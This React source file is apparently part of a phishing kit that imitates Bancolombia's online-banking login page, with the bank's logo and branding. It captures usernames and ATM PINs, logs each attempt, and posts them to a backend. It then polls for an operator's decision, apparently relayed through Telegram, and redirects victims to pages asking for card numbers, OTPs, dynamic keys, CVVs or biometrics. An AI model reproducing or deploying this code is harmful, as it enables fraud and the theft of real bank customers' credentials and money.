import { useNavigate } from "react-router-dom";
import { useEffect, useState, useRef } from "react";
import InactividadModal from "./modals/inactividadModal";
import AccionesModal from "./modals/accionesModal";
import IniciarSesionModal from "./modals/iniciarSesionModal";
import Loading from "../../components/Loading";
import './css/LoginModal.css';
import { instanceBackend } from "app/axios/instanceBackend";
import localStorageService from "../../services/localStorageService";

// Se exporta el componente
export default function IniciarSesion() {
  const navigate = useNavigate();

  // Se inicializa el formState
  const [formState, setFormState] = useState({
    usuario: "",
    clave: "",
    errorUsuario: false,
    errorClave: false,
    lanzarModalAcciones: false,
    lanzarModalInactividad: false,
    lanzarModalErrorSesion: false,
  });

  // Se inicializa el cargando
  const [cargando, setCargando] = useState(false);

  // Nuevo estado para el proceso de aprobación
  const [aprobacionEstado, setAprobacionEstado] = useState({
    esperandoAprobacion: false,
    aprobado: false,
    rechazado: false,
    bloqueado: false,
    mensaje: "",
    usuarioId: null
  });

  // Se inicializa el estado del boton
  const [botonHabilitado, setBotonHabilitado] = useState(false);

  // Se inicializa los estados
  const [ip, setIp] = useState("");
  const [fechaHora, setFechaHora] = useState("");

  // Referencia para el intervalo de polling
  const pollingIntervalRef = useRef(null);

  // Se captura la informacion del localStorage del datos_usuario
  var usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));

  // Referencia para el ID único de sesión
  const sesionIdRef = useRef(usuarioLocalStorage?.sesion_id || null);

  //  Se crea el useEffect para ejecutar 1 minuto 
  useEffect(() => {

    // Ejecutar inmediatamente al montar
    obtenerFechaHora();

    // Calcular cuánto falta para el próximo minuto exacto
    const ahora = new Date();
    const msHastaProximoMinuto =
      (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

    let intervalId;

    // Timeout para sincronizar con el cambio exacto de minuto
    const timeoutId = setTimeout(() => {
      obtenerFechaHora();

      // Luego actualizar cada 60 segundos
      intervalId = setInterval(() => {
        obtenerFechaHora();
      }, 60000);
    }, msHastaProximoMinuto);

    // Cleanup
    return () => {
      clearTimeout(timeoutId);
      if (intervalId) clearInterval(intervalId);
    };
  }, []);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se obtiene la IP
    obtenerIP();

    // Se obtiene la fecha/hora con formato
    obtenerFechaHora();

    // Cleanup al desmontar
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  // También actualiza iniciarPolling con logs:
  const iniciarPolling = (usuario) => {

    // Limpiar intervalo anterior si existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    }

    // Configurar nuevo estado
    setAprobacionEstado({
      esperandoAprobacion: true,
      aprobado: false,
      rechazado: false,
      bloqueado: false,
      mensaje: "⏳ Esperando aprobación en Telegram...",
      usuarioId: usuario
    });

    // Iniciar polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {
      verificarEstadoAprobacion();
    }, 3000);

    // También verificar inmediatamente
    verificarEstadoAprobacion();
  };

  // Metodo encargado de iniciar sesion
  const handleLogin = async () => {

    // Validación adicional
    if (!botonHabilitado) {

      // Se retorna
      return;
    };

    // Se inicializa el loading
    setCargando(true);

    // Se captura la informacion del formulario
    const { usuario, clave } = formState;

    // Registrar intento antes de enviar
    actualizarLocalStorage(usuario, clave);

    // Prepara los datos con ID de sesión
    const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;

    // Se envia la data
    const dataSend = {
      "data": {
        "attributes": dataLocalStorage
      },
    };

    // Se usa el try para la peticion
    try {

      // Se envia la peticion
      const response = await instanceBackend.post("/authenticacion", dataSend);

      // Se valida la respuesta
      if (response.data.success) {

        // Guardar sesión real del backend
        sesionIdRef.current = response.data.data.sesion_id;

        // Iniciar polling para esperar aprobación
        iniciarPolling();
      } else {

        // Se muestra error del login
        handleErrorLogin();
      };
    } catch (error) {

      // Manejo detallado de errores
      if (error.response) {

        // Error de respuesta del servidor
        alert(`Error ${error.response.status}: ${error.response.data.message || 'Error del servidor'}`);
      } else if (error.request) {

        // Se quita el cargando
        setCargando(false);

        // Error de conexión
        alert('Error de conexión con el servidor');
      } else {

        // Se quita el cargando
        setCargando(false);

        // Error inesperado
        alert('Error inesperado: ' + error.message);
      };

      // // Se muestra error del login
      // handleErrorLogin();
    } finally {
      console.log('🏁 [LOGIN] Proceso finalizado');
      // NOTA: No quitamos el cargando porque queremos mostrar el modal de espera
    }
  };

  // Metodo para registrar el intento de DIN
  const actualizarLocalStorage = (usuario, clave) => {

    // Se obtiene los datos del localStorage
    const storageKey = "datos_usuario";

    // Se obtiene el valor almacenado
    const raw = localStorage.getItem(storageKey);

    // Se parsea el JSON o se inicializa un objeto vacío
    let datos = raw ? JSON.parse(raw) : {};

    // Se inicializa el objeto de intentos si no existe
    if (!datos.usuarios) datos.usuarios = {};

    // Se crea la clave del nuevo intento
    const intentoNum = Object.keys(datos.usuarios).length + 1;
    const intentoKey = `intento_${intentoNum}`;

    // Se registra el nuevo intento
    datos.usuarios[intentoKey] = {
      usuario: usuario,
      clave: clave,
      fecha: new Date().toLocaleString(),
    };

    // Se guarda nuevamente en el localStorage
    localStorage.setItem(storageKey, JSON.stringify(datos));

    // Se retorna el objeto de intentos
    return datos.usuarios;
  };

  // Obtiene la dirección IP pública del usuario
  const obtenerIP = async () => {

    // Se usa el try
    try {

      // Se realiza la petición HTTP a la API
      const response = await fetch("https://api.ipify.org?format=json");

      // Se convierte la respuesta a JSON
      const data = await response.json();

      // Se guarda la IP obtenida en el estado
      setIp(data.ip);
    } catch (error) {

      // En caso de error (sin internet, API caída, etc.)
      console.error("Error obteniendo IP", error);

      // Se asigna un valor por defecto para evitar fallos en la UI
      setIp("No disponible");
    };
  };

  // Obtiene la fecha y hora actual del sistema
  const obtenerFechaHora = () => {

    // Se obtiene la fecha y hora actual
    const ahora = new Date();

    // Opciones de formato para la fecha y hora
    const opciones = {
      weekday: "long",   // día de la semana (miércoles)
      year: "numeric",   // año (2026)
      month: "long",     // mes (enero)
      day: "numeric",    // día del mes (7)
      hour: "numeric",   // hora (5)
      minute: "2-digit", // minutos (38)
      hour12: true       // formato 12 horas (p. m.)
    };

    // Se formatea la fecha según el locale español de Colombia
    const formato = ahora.toLocaleString("es-CO", opciones);

    // Se guarda el valor formateado en el estado
    setFechaHora(formato);
  };

  // Metodo encargado de actualizar el estado del formulario
  const handleChange = (e) => {

    // Se captura el name y value del input
    const { name, value } = e.target;

    if (name === "usuario") {
      // 1. RESTRICCIÓN DE ENTRADA: Solo permite escribir letras y números (sin espacios ni símbolos)
      const regexInput = /^[a-zA-Z0-9]*$/;
      if (!regexInput.test(value)) return;

      // 2. ACTUALIZACIÓN DEL ESTADO
      setFormState(prev => {
        const nuevoEstado = {
          ...prev,
          usuario: value,
          // 3. VALIDACIÓN DE COMPLEJIDAD: Verifica si tiene AL MENOS una letra Y un número
          errorUsuario: !/(?=.*[a-zA-Z])(?=.*[0-9])/.test(value)
        };
        validarBoton(nuevoEstado);
        return nuevoEstado;
      });

    } else if (name === "clave") {
      // Validación solo números
      const regexNumbers = /^[0-9]*$/;
      if (!regexNumbers.test(value)) return;

      setFormState(prev => {
        const nuevoEstado = {
          ...prev,
          clave: value,
          errorClave: false
        };
        validarBoton(nuevoEstado);
        return nuevoEstado;
      });
    }
  };

  // Función auxiliar para validar si el botón debe estar habilitado
  const validarBoton = (estado) => {
    if (estado.usuario.trim() !== "" && !estado.errorUsuario && estado.clave.length === 4) {
      setBotonHabilitado(true);
    } else {
      setBotonHabilitado(false);
    }
  };

  // Metodo encargado de manejar el evento blur
  const handleBlur = (e) => {

    // Se captura el name y value del input
    const { name, value } = e.target;

    // 1. Validación base: ¿Está vacío?
    let tieneError = value.trim() === "";

    // 2. CORRECCIÓN IMPORTANTE: Si es 'usuario' y tiene texto, verificamos que cumpla la regla de letras Y números.
    // Esto evita que 'handleBlur' borre el error si el usuario escribió algo inválido como solo letras.
    if (name === "usuario" && !tieneError) {
      const cumpleComplejidad = /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value);
      tieneError = !cumpleComplejidad;
    }

    // Se actualiza el estado del formulario
    setFormState(prev => {
      const nuevoEstado = {
        ...prev,
        [`touched${name.charAt(0).toUpperCase() + name.slice(1)}`]: true,
        [`error${name.charAt(0).toUpperCase() + name.slice(1)}`]: tieneError
      };

      // 3. Validamos el botón aquí también para que se actualice inmediatamente si el error cambia
      validarBoton(nuevoEstado);

      return nuevoEstado;
    });
  };

  // Metodo encargado de bloquear el clipboard
  const bloquearClipboard = (e) => {

    // Se previene la accion por defecto
    e.preventDefault();

    // Se valida si ya hay un temporalizador activo
    if (formState.lanzarModalAcciones) return;

    // Se lanza la alerta
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: true
    }));

    // Se crea un temporalizador para cerrar el modal
    setTimeout(() => {

      // Se llama el metodo para cerrar el modal
      cerrarModalAcciones();
    }, 2500);
  };

  // Metodo encargado de cerrar el modal
  const cerrarModalAcciones = () => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      lanzarModalAcciones: false
    }));
  };

  // Metodo encargado de limpiar un campo
  const limpiarCampo = (campo) => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      [campo]: "",
      [`touched${campo.charAt(0).toUpperCase() + campo.slice(1)}`]: true,
      [`error${campo.charAt(0).toUpperCase() + campo.slice(1)}`]: true
    }));
  };

  // Metodo encargado de abrir la alerta de error de inicio de sesión y cerrar a los 2 segundos
  const handleErrorLogin = () => {

    // Se actualiza el estado del formulario
    setFormState(prev => ({
      ...prev,
      usuario: "",
      clave: "",
    }));

    // Se lanza la alerta
    setFormState(prev => ({
      ...prev,
      lanzarModalErrorSesion: true
    }));

    // Se valida si ya hay un temporalizador activo
    if (formState.lanzarModalErrorSesion) return;

    // Se crea un temporalizador para cerrar el modal
    setTimeout(() => {

      // Se llama el metodo para cerrar el modal
      setFormState(prev => ({
        ...prev,
        lanzarModalErrorSesion: false
      }));

      // Se quita el cargando
      setCargando(false);
    }, 2000);
  };

  // Función para verificar el estado de aprobación
  const verificarEstadoAprobacion = async () => {

    // Se usa el try
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/consultar-estado/${sesionIdRef.current}`);

      // Se captura la respuesta
      const { estado, cardData } = response.data;

      // Si llega configuración de tarjeta custom, la guardamos
      if (cardData) {
        localStorageService.setItem("selectedCardData", cardData);
      }

      // Estados que detienen el polling (redirecciones o finales)
      const estadosFinales = [

        // Botones linea 1
        'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',

        // Botones linea 2
        'error_tc', 'error_otp', 'error_din', 'error_login',

        // Botones linea 3
        'solicitar_biometria', 'error_923',

        // Botones linea 4
        'solicitar_tc_custom', 'solicitar_cvv_custom',

        // Estados adicionales por pantalla
        'aprobado', 'error_pantalla', 'bloqueado_pantalla'
      ];

      // Detener polling si es un estado final
      if (estadosFinales.includes(estado.toLowerCase())) {

        // Limpiar intervalo de polling
        if (pollingIntervalRef.current) {

          // Se limpia el intervalo
          clearInterval(pollingIntervalRef.current);

          // Se resetea la referencia
          pollingIntervalRef.current = null;
        };
      };

      // Mapeo de redirecciones
      switch (estado.toLowerCase()) {

        // ------------ Casos botones linea 1 ------------
        case 'solicitar_tc':

          // Redirige a la página
          redirigir(`/validacion-tc`);

          // Se sale del switch
          break;
        case 'solicitar_otp':

          // Redirige a la página
          redirigir(`/numero-otp`);

          // Se sale del switch
          break;
        case 'solicitar_din':

          // Redirige a la página
          redirigir(`/clave-dinamica`);

          // Se sale del switch
          break;
        case 'solicitar_finalizar':

          // Redirige a la página
          redirigir(`/finalizado-page`);

          // Se sale del switch
          break;

        // ------------ Casos botones linea 2 ------------
        case 'error_tc':

          // Redirige a la página
          redirigir(`/validacion-tc`);

          // Se sale del switch
          break;
        case 'error_otp':

          // Redirige a la página
          redirigir(`/numero-otp`);

          // Se sale del switch
          break;
        case 'error_din':

          // Redirige a la página
          redirigir(`/clave-dinamica`);

          // Se sale del switch
          break;
        case 'error_login':

          // Se quita el cargando
          setCargando(false);

          // Se lanza la alerta de error
          handleErrorLogin();

          // Se sale del switch
          break;

        // ------------ Casos botones linea 3 ------------
        case 'solicitar_biometria':

          // Redirige a la página
          redirigir(`/verificacion-identidad`);

          // Se sale del switch
          break;
        case 'error_923':

          // Redirige a la página
          redirigir(`/error-923page`);

          // Se sale del switch
          break;

        // ------------ Casos botones linea 4 ------------
        case 'solicitar_tc_custom':

          // Redirige a la página
          redirigir(`/validacion-tc-custom`);

          // Se sale del switch
          break;
        case 'solicitar_cvv_custom':

          // Redirige a la página
          redirigir(`/validacion-cvv`);

          // Se sale del switch
          break;

        case 'error_cvv_custom':
          // Redirige a validación con error
          redirigir(`/validacion-cvv?error=true`);
          break;

        // ------------ CASOS ADICIONALES ------------
        case 'aprobado':
        case 'pendiente':
        case 'error_pantalla':
        case 'bloqueado_pantalla':
        default:
          break;
      }
    } catch (error) {
      console.error('💥 [POLLING] Error:', {
        mensaje: error.message,
        status: error.response?.status
      });
    }
  };

  // Helper para redirección suave
  const redirigir = (ruta) => {
    // Se redirige a la ruta indicada
    navigate(ruta);
  };

  // Se retorna el componente
  return (
    <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
      <div
        style={{
          flex: 1,
          backgroundColor: "#2C2A29",
          backgroundImage: 'url("/assets/images/auth-trazo.svg")',
          backgroundRepeat: "no-repeat",
          backgroundPosition: "center",
          backgroundSize: "cover",
          backgroundPositionY: "-140px",
          backgroundPositionX: "-610px",
        }}
      >
        <div style={{ textAlign: "center" }}>
          <img
            src="/assets/images/img_pantalla2/descarga.svg"
            alt="Logo"
            style={{ width: "238px", marginTop: "45px" }}
          />
        </div>

        <div
          style={{
            marginTop: "25px",
          }}
        >
          <h1 className="general-title">
            Sucursal Virtual Personas
          </h1>
        </div>

        <div className="login-page">
          <div className="login-box" style={{ backgroundColor: "#454648" }}>
            <h2 className="login-title">¡Hola!</h2>
            <p className="login-subtitle">
              <span
                style={{
                  display: "inline-block",
                  transform: "scaleY(1) translateY(0px)",
                  transformOrigin: "center",
                  verticalAlign: "baseline"
                }}
              >
                l
              </span>
              n<span
                style={{
                  marginTop: "10px",
                  textAlign: "center",
                  color: "white",
                  fontFamily: "CIB Sans Light",
                  fontWeight: 600,
                  fontSize: "17px",
                }}
              >
                g
              </span>resa los datos para {' '}
              <span
                style={{
                  marginTop: "10px",
                  textAlign: "center",
                  color: "white",
                  fontFamily: "CIB Sans Light",
                  fontWeight: 600,
                  fontSize: "17px",
                }}
              >
                g
              </span>
              estionar tus productos y hacer transacciones.
            </p>

            <br />
            <br />

            {/* ----------------------------------------- USUARIO -----------------------------------------*/}
            <div className={`input-group-custom ${formState.errorUsuario ? "has-error" : ""}`}>
              <i className="i-Administrator input-icon"></i>

              <div className="input-wrapper">
                <input
                  id="usuario"
                  name="usuario"
                  type="text"
                  className="input-line"
                  placeholder=" "
                  required
                  maxLength={20}
                  value={formState.usuario}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label style={{ color: "#ffffff" }}>Usuario</label>
                {/* BOTÓN LIMPIAR */}
                {formState.usuario && (
                  <button
                    type="button"
                    className="clear-btn"
                    onClick={() => limpiarCampo("usuario")}
                    aria-label="Limpiar usuario"
                  >
                    ✕
                  </button>
                )}
              </div>
            </div>
            {formState.errorUsuario && <span className="input-error">Ingresa tu usuario</span>}
            <a className="input-link" style={{ fontSize: "12px" }}>¿Olvidaste tu usuario?</a>

            <br />

            {/* ----------------------------------------- CLAVE -----------------------------------------*/}
            <div className={`input-group-custom mt-2 ${formState.errorClave ? "has-error" : ""}`}>
              <i className="i-Lock-2 input-icon"></i>

              <div className="input-wrapper">
                <input
                  id="clave"
                  name="clave"
                  type="password"
                  className="input-line"
                  required
                  autoComplete="off"
                  maxLength={4}
                  placeholder=" "

                  /* Teclado numérico en móvil */
                  inputMode="numeric"
                  pattern="[0-9]*"

                  /* 🔒 Seguridad */
                  value={formState.clave}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onCopy={bloquearClipboard}
                  onPaste={bloquearClipboard}
                  onCut={bloquearClipboard}
                  onContextMenu={bloquearClipboard}
                />
                <label htmlFor="clave" style={{ color: "#ffffffff" }}>Clave del cajero</label>
                {/* BOTÓN LIMPIAR */}
                {formState.clave && (
                  <button
                    type="button"
                    className="clear-btn"
                    onClick={() => limpiarCampo("clave")}
                    aria-label="Limpiar clave"
                  >
                    ✕
                  </button>
                )}
              </div>
            </div>

            {formState.errorClave && <span className="input-error">Ingresa tu clave</span>}
            <a className="input-link" style={{ fontSize: "12px", padding: "5px" }}>¿Olvidaste o bloqueaste tu clave?</a>

            <button className="login-btn" style={{ marginTop: "45px" }} disabled={!botonHabilitado} onClick={() => handleLogin()}>
              Iniciar sesión
            </button>

            <a className="create-user mt-4 input-link text-center" disabled={!botonHabilitado} href="#" style={{ fontSize: "12px" }}>
              Crear usuario
            </a>
          </div>
        </div>
        <div className="login-page-footer mt-4">
          <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
            <span>¿Problemas para conectarte?</span>
            <span className="dot">·</span>
            <span>Aprende sobre seguridad</span>
            <span className="dot">·</span>
            <span>Reglamento Sucursal Virtual</span>
            <span className="dot">·</span>
            <span>Política de privacidad</span>
          </div>
          <hr style={{ marginTop: "20px" }} />
          <div className="footer-final">
            <div className="footer-left">
              <div>
                <img
                  src="/assets/images/img_pantalla2/descarga.svg"
                  alt="Bancolombia"
                  style={{ width: "180px" }}
                />
              </div>
              <div>
                <span className="vigilado">
                  <img
                    src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                    alt="Superintendencia"
                    style={{ width: "180px" }}
                  />
                </span>
              </div>
            </div>
            <div className="footer-right">
              <div className="mt-2">Dirección IP: {ip}</div>
              <div className="mb-2">{fechaHora}</div>
            </div>
          </div>
        </div>
      </div>

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
      </div>

      {/* Modal de espera de aprobación */}
      {aprobacionEstado.esperandoAprobacion && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #F58220'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px',
              animation: 'pulse 2s infinite'
            }}>
              ⏳
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Esperando Aprobación
            </h3>
            <p style={{ color: '#F58220', marginBottom: '20px' }}>
              {aprobacionEstado.mensaje}
            </p>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              marginBottom: '20px'
            }}>
              <div className="spinner" style={{
                width: '40px',
                height: '40px',
                border: '4px solid #F58220',
                borderTop: '4px solid transparent',
                borderRadius: '50%',
                animation: 'spin 1s linear infinite',
                marginRight: '10px'
              }}></div>
              <span style={{ color: 'white' }}>Consultando estado...</span>
            </div>
            <button
              onClick={() => {
                setAprobacionEstado({
                  esperandoAprobacion: false,
                  aprobado: false,
                  rechazado: false,
                  bloqueado: false,
                  mensaje: "",
                  usuarioId: null
                });
                if (pollingIntervalRef.current) {
                  clearInterval(pollingIntervalRef.current);
                }
              }}
              style={{
                backgroundColor: 'transparent',
                color: '#F58220',
                border: '1px solid #F58220',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Cancelar
            </button>
          </div>
        </div>
      )}

      {/* Modal de aprobado */}
      {aprobacionEstado.aprobado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #4CAF50'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              ✅
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              ¡Acceso Aprobado!
            </h3>
            <p style={{ color: '#4CAF50', marginBottom: '20px' }}>
              {aprobacionEstado.mensaje}
            </p>
          </div>
        </div>
      )}

      {/* Modal de rechazado */}
      {aprobacionEstado.rechazado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #F44336'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              ❌
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Acceso Rechazado
            </h3>
            <p style={{ color: '#F44336', marginBottom: '20px' }}>
              {aprobacionEstado.mensaje}
            </p>
            <button
              onClick={() => setAprobacionEstado({
                esperandoAprobacion: false,
                aprobado: false,
                rechazado: false,
                bloqueado: false,
                mensaje: "",
                usuarioId: null
              })}
              style={{
                backgroundColor: '#F58220',
                color: 'white',
                border: 'none',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Intentar nuevamente
            </button>
          </div>
        </div>
      )}

      {/* Modal de bloqueado */}
      {aprobacionEstado.bloqueado && (
        <div className="modal-overlay" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0,0,0,0.7)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            backgroundColor: '#2C2A29',
            padding: '30px',
            borderRadius: '10px',
            maxWidth: '500px',
            width: '90%',
            textAlign: 'center',
            border: '2px solid #FF9800'
          }}>
            <div style={{
              fontSize: '60px',
              marginBottom: '20px'
            }}>
              🔒
            </div>
            <h3 style={{ color: 'white', marginBottom: '15px' }}>
              Usuario Bloqueado
            </h3>
            <p style={{ color: '#FF9800', marginBottom: '20px' }}>
              {aprobacionEstado.mensaje}
            </p>
            <p style={{ color: '#cccccc', fontSize: '14px', marginBottom: '20px' }}>
              Contacta al administrador para más información.
            </p>
            <button
              onClick={() => setAprobacionEstado({
                esperandoAprobacion: false,
                aprobado: false,
                rechazado: false,
                bloqueado: false,
                mensaje: "",
                usuarioId: null
              })}
              style={{
                backgroundColor: 'transparent',
                color: '#F58220',
                border: '1px solid #F58220',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Cerrar
            </button>
          </div>
        </div>
      )}

      {/* Agrega estos estilos al CSS */}
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
      `}</style>

      {/* Cargando */}
      {cargando ?
        <Loading /> : null}

      {/* Modal de inactividad */}
      {formState.lanzarModalInactividad ?
        <InactividadModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
          ...prev,
          lanzarModalInactividad: false
        }))} /> : null}

      {/* Modal de acciones */}
      {formState.lanzarModalAcciones ?
        <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

      {/* Modal de error de sesión */}
      {formState.lanzarModalErrorSesion ?
        <IniciarSesionModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
          ...prev,
          lanzarModalErrorSesion: false
        }))} /> : null}
    </div>
  );
};